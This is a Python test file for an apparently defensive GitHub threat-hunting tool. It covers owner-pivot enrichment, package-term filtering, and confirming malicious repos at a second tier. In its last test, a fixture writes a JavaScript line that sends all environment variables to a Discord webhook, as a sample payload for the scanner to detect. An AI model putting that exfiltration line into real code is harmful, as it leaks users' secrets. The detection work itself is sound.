"""Tests for the threat-hunting enrichment engine (owner + package pivots)."""

from __future__ import annotations

import json

from conftest import utcnow

from git_warden.db import Database
from git_warden.enums import ArtifactType, DetectionMethod, FeedSource, RepoFindingStatus
from git_warden.hunt import hunt
from git_warden.models import MaliciousArtifact, RedTeamTool, RepoFinding
from git_warden.scanning.enrichment import find_owner_repos

TOOLS = [RedTeamTool(name="Sliver", org="BishopFox", repos=["BishopFox/sliver"])]


def _repo(full):
    return {"full_name": full, "owner": {"login": full.split("/")[0]},
            "html_url": f"https://github.com/{full}"}


def test_malicious_repo_owners_only_from_confirmed_findings(tmp_path):
    db = Database.open(tmp_path / "o.sqlite")
    db.start_run("r1", utcnow())
    # OSM repo ownership is an impersonation target (victim) -- must NOT seed.
    for name in ("tiledesk/server", "tiledesk/dashboard", "tiledesk/ai"):
        db.upsert_artifact(MaliciousArtifact(
            artifact_type=ArtifactType.REPO, name=name, ecosystem="github",
            source=FeedSource.OPEN_SOURCE_MALWARE,
            raw_payload={"resource_identifier": f"https://github.com/{name}"}), "r1")
    db.upsert_finding(RepoFinding(full_name="badguy/stealer",
                                  detection_method=DetectionMethod.IOC_SEARCH,
                                  status=RepoFindingStatus.CONFIRMED), "r1")
    owners = db.malicious_repo_owners()
    assert owners == {"badguy"}      # only the owner of a repo WE confirmed
    assert "tiledesk" not in owners  # heavily-typosquatted legit org, never seeded
    db.close()


def test_malicious_package_terms_filters_generic(tmp_path):
    db = Database.open(tmp_path / "p.sqlite")
    db.start_run("r1", utcnow())
    for name in ["@scope/evil-pkg", "data-utils-d703", "api"]:
        db.upsert_artifact(MaliciousArtifact(
            artifact_type=ArtifactType.PACKAGE, name=name, ecosystem="npm",
            source=FeedSource.OPEN_SOURCE_MALWARE), "r1")
    terms = db.malicious_package_terms()
    assert "@scope/evil-pkg" in terms     # scoped -> kept
    assert "data-utils-d703" in terms     # >= 8 chars -> kept
    assert "api" not in terms             # too generic -> dropped
    db.close()


def test_find_owner_repos_excludes_known():
    class C:
        def list_user_repos(self, login, per_page=100):
            if login != "evilcorp":
                return []
            return [_repo("evilcorp/dropper"), _repo("evilcorp/other")]
    repos = find_owner_repos(C(), ["evilcorp"], known={"evilcorp/dropper"})
    assert {r.full_name for r in repos} == {"evilcorp/other"}


class _EnrichClient:
    def list_forks(self, owner, name, per_page=100, sort="newest"):
        return []

    def search_repositories(self, query, per_page=10):
        return []

    def search_code(self, query, per_page=20):
        return []

    def get_readme(self, owner, name):
        return None

    def list_user_repos(self, login, per_page=100):
        return [_repo("evilcorp/new-dropper")] if login == "evilcorp" else []


def test_hunt_owner_pivot_creates_candidates(tmp_path):
    db = Database.open(tmp_path / "h.sqlite")
    db.start_run("seed", utcnow())
    # A repo WE confirmed makes its owner a proven actor to pivot from.
    db.upsert_finding(RepoFinding(full_name="evilcorp/dropper",
                                  detection_method=DetectionMethod.IOC_SEARCH,
                                  status=RepoFindingStatus.CONFIRMED), "seed")

    hunt(db, _EnrichClient(), TOOLS, run_id="hunt-e", now=utcnow(),
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=True, do_tier2=False)

    row = db.conn.execute(
        "SELECT detection_method FROM repo_findings WHERE full_name = ?",
        ("evilcorp/new-dropper",),
    ).fetchone()
    assert row is not None  # owner pivot surfaced the malicious owner's other repo
    assert row["detection_method"] == DetectionMethod.MALICIOUS_OWNER.value
    _ = json
    db.close()


def test_osm_repo_ownership_never_seeds_owner_pivot(tmp_path):
    db = Database.open(tmp_path / "ro.sqlite")
    db.start_run("r1", utcnow())
    # No matter how many OSM repos an owner has, OSM ownership alone never seeds
    # the owner pivot -- those repos are impersonation targets (legit victims).
    for owner, name in [
        ("victim", "interviewtask"), ("legitorg", "dropper1"), ("legitorg", "dropper2"),
    ]:
        db.upsert_artifact(MaliciousArtifact(
            artifact_type=ArtifactType.REPO, name=f"{owner}/{name}", ecosystem="github",
            source=FeedSource.OPEN_SOURCE_MALWARE,
            raw_payload={"resource_identifier": f"https://github.com/{owner}/{name}"}), "r1")
    assert db.malicious_repo_owners() == set()  # no confirmed findings -> no owners
    db.close()


def test_is_defensive_repo_excludes_catalogs():
    from git_warden.scanning import is_defensive_repo
    assert is_defensive_repo("ossf/malicious-packages")
    assert is_defensive_repo("opensource-for-freedom/git_warden")
    assert is_defensive_repo("someone/osv-rss")
    assert not is_defensive_repo("evilcorp/stealer")


def test_intel_candidate_reaches_tier2_without_name_signal(tmp_path):
    # An owner-pivot repo with a benign NAME still reaches Tier-2 (its discovery
    # signal is the suspicion) -- and a malicious payload confirms it.
    db = Database.open(tmp_path / "it.sqlite")
    db.start_run("seed", utcnow())
    # A confirmed repo makes evilcorp a proven actor; the pivot enumerates more.
    db.upsert_finding(RepoFinding(full_name="evilcorp/known-bad",
                                  detection_method=DetectionMethod.IOC_SEARCH,
                                  status=RepoFindingStatus.CONFIRMED), "seed")

    class C(_EnrichClient):
        def list_user_repos(self, login, per_page=100):
            return [_repo("evilcorp/innocent-looking-utils")] if login == "evilcorp" else []

    def clone_mal(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "index.js").write_text(
            "fetch('https://discord.com/api/webhooks/1/x',{method:'POST',"
            "body:JSON.stringify(process.env)});\n", encoding="utf-8")
        return dest

    hunt(db, C(), TOOLS, run_id="hunt-it", now=utcnow(),
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=True,
         do_tier2=True, clone=clone_mal)
    row = db.conn.execute(
        "SELECT status FROM repo_findings WHERE full_name = ?",
        ("evilcorp/innocent-looking-utils",)).fetchone()
    assert row["status"] == "confirmed"  # benign name, but exfil payload confirms
    db.close()
